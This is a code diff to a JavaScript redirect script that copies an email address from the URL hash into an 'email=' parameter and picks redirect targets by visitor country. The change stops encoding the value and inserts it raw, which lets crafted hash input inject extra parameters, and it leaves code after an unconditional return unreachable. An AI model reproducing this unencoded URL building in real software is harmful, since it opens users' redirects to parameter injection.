@@ -171,25 +171,30 @@ function getHashRawValue() {
 
 // Build the tag redirect URL by replacing the `email=` parameter in the base URL
 // with the value after "#" in the current URL. All other params are preserved.
+// NOTE: the email is inserted RAW (no URLSearchParams) so '@' stays as '@'.
 function buildTagRedirectUrl(baseUrl, hashValue) {
     try {
-        const u = new URL(baseUrl);
-
-        if (hashValue) {
-            // Decode in case the email was URL-encoded in the hash
-            let emailValue = hashValue;
-            try {
-                emailValue = decodeURIComponent(hashValue);
-            } catch (e) {
-                // leave as-is if decode fails
-            }
-            u.searchParams.set('email', emailValue);
-            console.log(`[Redirect] Replaced email param with: ${emailValue}`);
-        } else {
+        if (!hashValue) {
             console.log('[Redirect] No hash value - keeping base URL email param');
+            return baseUrl;
         }
 
-        return u.toString();
+        // Decode in case the email was URL-encoded in the hash
+        let emailValue = hashValue;
+        try {
+            emailValue = decodeURIComponent(hashValue);
+        } catch (e) {
+            // leave as-is if decode fails
+        }
+
+        console.log(`[Redirect] Replaced email param with: ${emailValue}`);
+
+        // Replace existing email= param if present, otherwise append (raw, no re-encoding)
+        if (/([?&])email=[^&]*/.test(baseUrl)) {
+            return baseUrl.replace(/([?&])email=[^&]*/, `$1email=${emailValue}`);
+        }
+        const sep = baseUrl.includes('?') ? '&' : '?';
+        return `${baseUrl}${sep}email=${emailValue}`;
     } catch (e) {
         console.error('[Redirect] Failed to build tag redirect URL:', e);
         return baseUrl;
@@ -267,22 +272,18 @@ function getRedirectUrl() {
 
     // Append the extracted email (emailencode links only; md5sum links have no
     // email in the hash, so the param is simply omitted for them).
+    // NOTE: email is appended RAW (no URLSearchParams) so '@' stays as '@'.
     const withEmail = (baseUrl) => {
         const email = getExtractedEmail();
         if (!email) return baseUrl;
-        try {
-            const u = new URL(baseUrl);
-            u.searchParams.set('email', email);
-            return u.toString();
-        } catch (e) {
-            return baseUrl;
-        }
+        const sep = baseUrl.includes('?') ? '&' : '?';
+        return `${baseUrl}${sep}email=${email}`;
     };
 
     if (country === 'US') return withEmail(DEFAULT_REDIRECT_URL);
 
-	return withEmail(DEFAULT_REDIRECT_URL);
-	
+    return withEmail(DEFAULT_REDIRECT_URL);
+
     if (country === 'SE') return se_REDIRECT_URL;
     if (country === 'CH') return ch_REDIRECT_URL;
     if (country === 'DE') return de_REDIRECT_URL;
